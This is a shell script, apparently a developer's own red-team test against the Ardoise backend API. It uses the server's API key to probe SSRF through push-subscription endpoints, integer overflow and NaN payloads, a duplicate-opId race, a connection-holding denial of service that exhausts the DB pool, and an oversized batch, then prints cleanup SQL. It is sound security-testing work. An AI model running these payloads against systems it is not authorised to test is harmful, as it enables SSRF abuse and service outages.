#!/usr/bin/env sh
# RED TEAM — Ardoise (avec clé, à exécuter SUR LE SERVEUR dans le repo)
#
# Attaques testées (toutes derrière la clé = profil A2/A3 "ami ou clé fuitée") :
#   A. SSRF : le serveur POST-il vers l'URL d'endpoint qu'on lui a donnée ?
#   B. Overflow int (F8) : lamport/createdAt 10^40 → 422 ou 500 ?
#   C. Race opId identique en parallèle (D34, déjà acceptée — confirmation)
#   D. DOUBLET : endpoint qui "hold" le TCP → 16 fan-outs bloqués → pool DB
#      (5+10) épuisé → l'API entière ralentit (30 s) puis 500.
#   E. Gros batch 20 000 ops (F9, info)
#
# Tout le contenu d'essai est confiné à UN groupe poubelle créé ici.
# Les listeners (8098/8099) sont tués à la fin ; le SQL de cleanup est affiché.
#
# Usage:  sh scripts/red-team-keyed.sh
# Overrides: BACKEND=http://host:port  BACKEND_CONTAINER=ardoise-backend
set -u
KEY="$(grep -E '^API_KEY=' .env | cut -d= -f2-)"
[ -n "$KEY" ] || { echo "API_KEY introuvable dans .env racine"; exit 1; }
H="X-API-Key: $KEY"
J="Content-Type: application/json"
U() { python3 -c 'import uuid;print(uuid.uuid4())'; }
T() { printf '\n\033[1m### %s\033[0m\n' "$1"; }
C() { curl -sS --max-time 60 -w '  [HTTP %{http_code}]' "$@"; }
NOW() { date +%s.%N; }

# ------------------------------------------------- découverte backend URL
B=""
CANDS="${BACKEND:-} http://127.0.0.1:8065 http://127.0.0.1:8000 http://127.0.0.1:3060"
LANIP="$(hostname -I 2>/dev/null | awk '{print $1}')"
[ -n "$LANIP" ] && CANDS="$CANDS http://$LANIP:8065 http://$LANIP:3060"
for c in $CANDS; do
  [ -n "$c" ] || continue
  if curl -sS -o /dev/null -m 2 "$c/api/v1/system/ping" 2>/dev/null; then B="$c"; break; fi
done
[ -n "$B" ] || { echo "BACKEND injoignable — tenté: $CANDS"; echo "  → sh scripts/red-team-keyed.sh avec BACKEND=http://host:port en env"; exit 1; }
echo "backend: $B"

# ------------------------------------------------- docker gateway (vue conteneur)
GW="172.17.0.1"
BC="${BACKEND_CONTAINER:-ardoise-backend}"
GW2="$(docker inspect "$BC" --format '{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}' 2>/dev/null | awk '{print $1}')"
[ -n "$GW2" ] && GW="$GW2"
echo "docker gateway (depuis le conteneur backend): $GW"

rm -f /tmp/rt-*.txt /tmp/rt-*.log /tmp/rt-*.json
G="$(U)"
DEV1="redteam-$(U)"
echo "groupe poubelle: $G"
echo "-- register (obligatoire avant push, flux de partage) :"
C "$B/api/v1/groups/register" -X POST -H "$H" -H "$J" -d "{\"groupId\":\"$G\"}"; echo

# ---------------------------------------------------------------- A. SSRF
T "A. SSRF — le serveur appelle-t-il l'URL d'endpoint qu'on choisit ?"
python3 - > /tmp/rt-ssrf.log 2>&1 <<'PY' &
import socket
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 8099)); s.listen(4); s.settimeout(25)
try:
    c, a = s.accept()
    data = c.recv(65536)
    open("/tmp/rt-ssrf-hit.txt","wb").write(data)
    c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
    c.close()
except socket.timeout:
    pass
PY
LSSRF=$!
sleep 0.5
SUB='{"endpoint":"http://'"$GW"':8099/ssrf-proof","keys":{"p256dh":"BOrHnQdBa3A0vHmR6GfV8mYqQ3sK9wZpLxT2rUvN4cDe","auth":"k8Jq2mN5xR7tY1zA"},"deviceId":"'"$DEV1"'","groupIds":["'"$G"'"]}'
echo "-- subscribe endpoint=$GW:8099 :"
C "$B/api/v1/push/subscribe" -X POST -H "$H" -H "$J" -d "$SUB"; echo
echo "-- push 1 op (doit déclencher le fan-out) :"
C "$B/api/v1/groups/$G/ops" -X POST -H "$H" -H "$J" \
  -d "{\"ops\":[{\"opId\":\"$(U)\",\"groupId\":\"$G\",\"entity\":\"group\",\"entityId\":\"$G\",\"action\":\"create\",\"payload\":{\"name\":\"RT-SSRF\"},\"actor\":\"redteam\",\"lamport\":1,\"createdAt\":1}]}"; echo
sleep 2
echo "-- ce que le listener a reçu (preuve SSRF si non vide) :"
if [ -s /tmp/rt-ssrf-hit.txt ]; then
  echo "  >>> REÇU SUR LE HOST <<<"
  head -c 500 /tmp/rt-ssrf-hit.txt; echo
  echo "  (le SERVEUR a POST vers une URL de notre choix)"
else
  echo "  (rien reçu — le fan-out est-il actif ? VAPID_PRIVATE_KEY défini ?)"
fi
kill $LSSRF 2>/dev/null

# ---------------------------------------------------------------- B. Overflow
T "B. Overflow int (F8)"
echo "-- lamport = 10^40 (attendu : 500 si vulnérable, 422 si borné) :"
C "$B/api/v1/groups/$G/ops" -X POST -H "$H" -H "$J" \
  -d "{\"ops\":[{\"opId\":\"$(U)\",\"groupId\":\"$G\",\"entity\":\"group\",\"entityId\":\"x\",\"action\":\"create\",\"payload\":{},\"actor\":\"redteam\",\"lamport\":10000000000000000000000000000000000000000,\"createdAt\":1}]}"; echo
echo "-- createdAt = 10^40 :"
C "$B/api/v1/groups/$G/ops" -X POST -H "$H" -H "$J" \
  -d "{\"ops\":[{\"opId\":\"$(U)\",\"groupId\":\"$G\",\"entity\":\"group\",\"entityId\":\"x\",\"action\":\"create\",\"payload\":{},\"actor\":\"redteam\",\"lamport\":1,\"createdAt\":10000000000000000000000000000000000000000}]}"; echo
echo "-- NaN / Infinity dans payload :"
C "$B/api/v1/groups/$G/ops" -X POST -H "$H" -H "$J" \
  -d "{\"ops\":[{\"opId\":\"$(U)\",\"groupId\":\"$G\",\"entity\":\"expense\",\"entityId\":\"x\",\"action\":\"create\",\"payload\":{\"amountCents\":NaN,\"note\":Infinity},\"actor\":\"redteam\",\"lamport\":1,\"createdAt\":1}]}"; echo
echo "-- contrôle : op valide (attendu : 200 accepted:1) :"
C "$B/api/v1/groups/$G/ops" -X POST -H "$H" -H "$J" \
  -d "{\"ops\":[{\"opId\":\"$(U)\",\"groupId\":\"$G\",\"entity\":\"group\",\"entityId\":\"$G\",\"action\":\"create\",\"payload\":{\"name\":\"RT-CTRL\"},\"actor\":\"redteam\",\"lamport\":1,\"createdAt\":1}]}"; echo

# ---------------------------------------------------------------- C. Race
T "C. Race opId identique en parallèle (D34 — confirmation, 1x 500 attendu)"
OID="$(U)"
BODY="{\"ops\":[{\"opId\":\"$OID\",\"groupId\":\"$G\",\"entity\":\"group\",\"entityId\":\"x\",\"action\":\"create\",\"payload\":{},\"actor\":\"redteam\",\"lamport\":1,\"createdAt\":1}]}"
C "$B/api/v1/groups/$G/ops" -X POST -H "$H" -H "$J" -d "$BODY" > /tmp/rt-race1.txt 2>&1 &
C "$B/api/v1/groups/$G/ops" -X POST -H "$H" -H "$J" -d "$BODY" > /tmp/rt-race2.txt 2>&1 &
wait
echo "  req1: $(cat /tmp/rt-race1.txt)"; echo "  req2: $(cat /tmp/rt-race2.txt)"

# ---------------------------------------------------------------- D. DOUBLET
T "D. DOUBLET — endpoint 'hold' x16 → épuisement du pool DB (5+10) ?"
echo "-- latence de base (pull, DB) :"
curl -sS -o /dev/null -w '  baseline: %{time_total}s [%{http_code}]\n' "$B/api/v1/groups/$G/ops?since=0" -H "$H"
python3 - > /tmp/rt-hold.log 2>&1 <<'PY' &
import socket, time
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 8098)); s.listen(64); s.settimeout(200)
n = 0
end = time.time() + 90
while time.time() < end:
    try:
        c, _ = s.accept(); n += 1
        if n % 16 == 0: print(n, "connexions holdées", flush=True)
    except socket.timeout:
        break
PY
LHOLD=$!
sleep 0.5
SUBH='{"endpoint":"http://'"$GW"':8098/hold","keys":{"p256dh":"BOrHnQdBa3A0vHmR6GfV8mYqQ3sK9wZpLxT2rUvN4cDe","auth":"k8Jq2mN5xR7tY1zA"},"deviceId":"'"$DEV1"'","groupIds":["'"$G"'"]}'
C "$B/api/v1/push/subscribe" -X POST -H "$H" -H "$J" -d "$SUBH" > /dev/null
echo "-- 16 pushes en parallèle (chacun spawn un fan-out bloqué sur le hold) :"
PIDS=""
for i in $(seq 1 16); do
  C "$B/api/v1/groups/$G/ops" -X POST -H "$H" -H "$J" \
    -d "{\"ops\":[{\"opId\":\"$(U)\",\"groupId\":\"$G\",\"entity\":\"group\",\"entityId\":\"$G\",\"action\":\"create\",\"payload\":{\"n\":$i},\"actor\":\"redteam\",\"lamport\":$i,\"createdAt\":1}]}" > /dev/null 2>&1 &
  PIDS="$PIDS $!"
done
wait $PIDS 2>/dev/null
sleep 2
echo "-- latence pull PENDANT le hold (attendu : ~30 s puis 500 si pool épuisé) :"
curl -sS -o /tmp/rt-dos-body.txt -w '  sous hold : %{time_total}s [%{http_code}]\n' --max-time 45 "$B/api/v1/groups/$G/ops?since=0" -H "$H"
head -c 120 /tmp/rt-dos-body.txt 2>/dev/null; echo
echo "-- latence ping (pas de DB — doit rester fluide) :"
curl -sS -o /dev/null -w '  ping      : %{time_total}s [%{http_code}]\n' "$B/api/v1/system/ping"
echo "-- release du hold (tu du server) → récupération :"
kill $LHOLD 2>/dev/null
for i in 1 2 3; do
  curl -sS -o /dev/null -w '  pull i='$i' : %{time_total}s [%{http_code}]\n' --max-time 45 "$B/api/v1/groups/$G/ops?since=0" -H "$H"
  sleep 1
done

# ---------------------------------------------------------------- E. Batch
T "E. Gros batch 20 000 ops (~9 Mo) — temps + accepted"
python3 - "$G" > /tmp/rt-big.json <<'PY'
import json, sys, uuid
g = sys.argv[1]
ops = [{"opId": str(uuid.uuid4()), "groupId": g, "entity": "group", "entityId": "x",
        "action": "create", "payload": {"name": "p" * 300}, "actor": "redteam",
        "lamport": 100000 + i, "createdAt": 1} for i in range(20000)]
print(json.dumps({"ops": ops}))
PY
ls -l /tmp/rt-big.json
t0="$(NOW)"
C "$B/api/v1/groups/$G/ops" -X POST -H "$H" -H "$J" --data @/tmp/rt-big.json
t1="$(NOW)"
echo "  durée: $(awk -v a="$t1" -v b="$t0" 'BEGIN{printf "%.1f", a-b}')s"
echo

# ---------------------------------------------------------------- cleanup
printf '\n\033[1m--- NETTOYAGE (MariaDB) ---\033[0m\n'
printf "DELETE FROM operations WHERE group_id = '%s';\nDELETE FROM push_subscriptions WHERE device_id = '%s';\nDELETE FROM groups WHERE id = '%s';\nrm -f /tmp/rt-*.txt /tmp/rt-*.log /tmp/rt-*.json\n" "$G" "$DEV1" "$G"
echo "(si un hold est encore en cours au moment du cleanup : pkill -f 'rt-hold' / pkill -f 8098)"
